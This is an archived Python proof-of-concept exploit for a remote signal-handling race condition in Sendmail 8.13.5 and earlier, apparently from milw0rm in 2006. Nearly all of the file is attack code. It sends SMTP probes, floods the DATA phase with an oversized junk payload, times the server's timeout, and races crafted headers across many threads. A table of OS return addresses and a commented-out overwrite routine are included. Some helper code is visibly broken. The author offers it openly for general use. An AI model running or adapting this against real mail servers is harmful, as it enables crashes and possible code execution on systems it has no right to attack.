<html><head><title>Sendmail <= 8.13.5 Remote Signal Handling Exploit PoC</title></head><pre>#!/usr/bin/env python
#
# redsand@blacksecurity.org
# Sendmail 8.13.5 and below Remote Signal Handling exploit
# usage: rbl4ck-sendmail.py 127.0.0.1 0 25
#
#

# this exploit was leaked to the PHC (Phrack High Council)
# so instead of only letting them have a copy, we figure
# everyone should have what they have.
#
# :-)

#
# several of the tested operating systems appear to crash at a static
# string in memory and we were unable to shift the location of that crash.
# However, Fedora gives us a nice sexy soft spot to land, one that allows us
# to control the flow of code execution
# this is only a proof of concept
#

import os, sys, socket, time, select, string, errno, threading

IP=&quot;127.0.0.1&quot;
PORT=25
fromdd = &quot;w00t@bex.redsand.net&quot;
def_arch = 0
def_timeout = (60 * 60) * 2 # 2 hrs
#def_timeout = 5 # 5 seconds
domain = &quot;localhost&quot;
total_time = None
threshold = 2.5

guess_timeout = 4.0

threads = 40

arch = [ 
	{ 'OS':'Debian 3.0-r1', 'offset':190, 'pad':28, 'return':0xbfbfdad1L }
	]

argc = len(sys.argv)
if(argc &gt; 1):
	IP = sys.argv[1]

if(argc &gt; 2):
	def_arch = int(sys.argv[2])

if(argc &gt; 3):
	PORT = int(sys.argv[3])

def	ia32(o):
	s=''
	w=chr(i % 256)
	o = o &gt;&gt; 8
	x=chr(i % 256)
	o = o &gt;&gt; 8
	y=chr(i % 256)
	o = o &gt;&gt; 8
	z=chr(i % 256)

	s = &quot;%c%c%c%c&quot; % (w,x,y,z)
	return s

def	substr(i, str, off):
	top=i[:off]
	end=i[off+len(str):]
	s = top + str + end
	return s
	


def	rout( str):
	print (&quot;[bl4ck]: &quot; + str)

def	mbanner():
	rout(&quot;Sendmail 8.13.5 and below Remote Signal Handling exploit by redsand@blacksecurity.org&quot;)
	rout(&quot;Supported Operating Systems:&quot;)
	p = 0
	for i in arch:
		rout(&quot;{%r} %s&quot; % (p, i['OS']))
		p += 1

def	rsend( s, str, p=True):
	sent = s.send(str )
	#sent = s.send(str + &quot;\r\n&quot;)
	if sent == 0:
		rout(&quot;socket send() failed&quot;)
	if(p):
		rout(&quot;Sent Request: \r\n\r\n%s\r\n&quot; % str)

def	probe(sock):
	str = &quot;HELO blacksecurity.org\r\nMAIL FROM: &lt;%s&gt;\r\nRCPT TO: root@%s\r\nDATA\r\n&quot; % (fromdd,domain)
	rsend(sock,str)


def	payload(size=32764):
	ret = &quot;\x7f&quot; * size
	i = 0
	while i &lt; size :
		ret = substr(ret,&quot;: &quot;,100 + i)
		ret = substr(ret,&quot;\r\n&quot;,200 + i)
		i += 202

	ret += &quot;\r\n&quot;
	return ret


class rSendmail( threading.Thread) :

	thres = threshold
	do_exit = False
	btime = None
	etime = None
	state = 0
	total_time = 0

	def	__init__(self, thresh=0):
		if not thresh == 0:
			self.thres = thresh
		threading.Thread.__init__ ( self )


	def     rrecv(self,s, response=None):
        	buf = ''
        	try:
	                buf = s.recv(2048)
	        except socket.error, (ecode, reason):
	                #rout(&quot;Socket failure %r:%s&quot; % (ecode, reason))
	                return False

        	if buf == '':
                	return False

        	rout(&quot;Reading response: \r\n\r\n%s\r\n&quot; % buf[0:-2])
       		msg = buf[0:-2].split(&quot;\r\n&quot;)
        	for m in msg:

                	k = m[0:3]
                	if (k != None) and (k != '') and (k != &quot;\x7f\x7f\x7f&quot;):
                        	code = int(m[0:3])
                	else:
                        	code = 0

                	if( code == 354 and self.state == 0 ):
                        	self.btime = time.time()
                        	self.state += 1
                        	return True
                	elif( code == 451 and self.state == 1):
                        	self.etime = time.time()
                        	self.state += 1
	                        return True
       	        	elif( code == 451 and self.state == 4):
                        	self.state += 1
                        	return True
                	elif( code == 354 and self.state == 3):
                        	self.state += 1
                        	return True

                	if (self.state == 5):
                        	self.state += 1
                        	rout(&quot;Debug error, unable to escalate state&quot;)
				self.stop()
				return False

	        if(response != None):
       	        	rsend(s,response)

	def stop(self):
		self.do_exit = True


	def run (self ):

		rout(&quot;Connecting to %s:%r&quot; % (IP,PORT))

		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.setblocking(0) # non-blocking 0hn0

		try:
			sock.connect((IP, PORT))
		except socket.error, (ecode, reason):
			if ecode in (115, 150): pass
			else:
				rout(&quot;Error %r:%s&quot; % (ecode,reason))
				return
	
			ret = select.select([sock],[sock],[], def_timeout)
	
			if len(ret[1]) == 0 and len (ret[0]) == 0:
				sock.close()
				rout(&quot;Timed out on connect&quot;)
				return
	
		rout(&quot;Setting non-blocking options with a default timeout of %r seconds&quot; % def_timeout)
	
		xplbuf = &quot;\xAF\xBE\xAD\xDE&quot;

		probe1 = False
		probe2 = False
		pump = False
	
		while not self.do_exit:
		
			readsock, writesock, err = select.select([sock],[sock],[], def_timeout)
			if len(readsock) &gt; 0:
				for s in readsock:
					self.rrecv(s)
	
			if len(writesock) &gt; 0:
				for s in writesock:
					if(self.state == 0):
						if not probe1:
							probe(s) # rsend(s,&quot;HELO&quot;)
							probe1 = True
						break
	
					if(self.state == 1):
						if not pump:
							pump = True
							time.sleep(guess_timeout - (0.9))
							rsend(s,payload(32764) + &quot;\r\n&quot;, False)
							rout(&quot;Sending heavy load&quot;)
	
						break
	
					if(self.state == 2):
					# measure timeout
					# wait = end - start  
					# where end is time of code 451 &amp; start is 354 go ahead
						self.total_time = (self.etime - self.btime) + self.thres
						#self.total_time = (self.etime - self.btime)
						self.state += 1
		
					if(self.state == 3):
						if not probe2:
							rsend(s,&quot;\n&quot;)
							probe(s)
							probe2 = True
						break
		
					if(self.state == 4):
						## race here
						# send bad header
						# lets wait 
						rsend(s, xplbuf + &quot;\r\n&quot;)
						rout(&quot;Sleeping...&quot;)
						time.sleep(self.total_time)
						rsend(s, xplbuf + &quot;\r\n&quot;)
		
						rout(&quot;Sent race-request&quot;)
						self.state = 5
						break
		
					if(self.state == 5):
						rout(&quot;State reached stage: %r&quot; % self.state)
						rout(&quot;Total wait time: %s&quot; % self.total_time)
						self.stop()
						break

		self.stop()
		return
					



mbanner()

t_list = []

t = threshold

opc = 0

while threading.activeCount() &lt; threads:
	opc += 1 
	rout(&quot;Starting Thread: %r with time+offset: %r&quot; % (opc, t))
        m = rSendmail(t)
        m.start()
        t += 0.2
	time.sleep(5)


sys.exit(5) # success ??

&quot;&quot;&quot;
buf = &quot;&quot;
atom = &quot;\\\xff&quot; * int(arch[def_arch]['pad'])
idx = 256 * 4
newtag=substr(xpl[idx:],ia32(arch[def_arch]['return']), int(arch[def_arch]['offset']))
xpl=substr(xpl, newtag, idx)
xpl=substr(xpl,atom,len(xpl))
&quot;&quot;&quot;

# milw0rm.com [2006-07-21]</pre></html>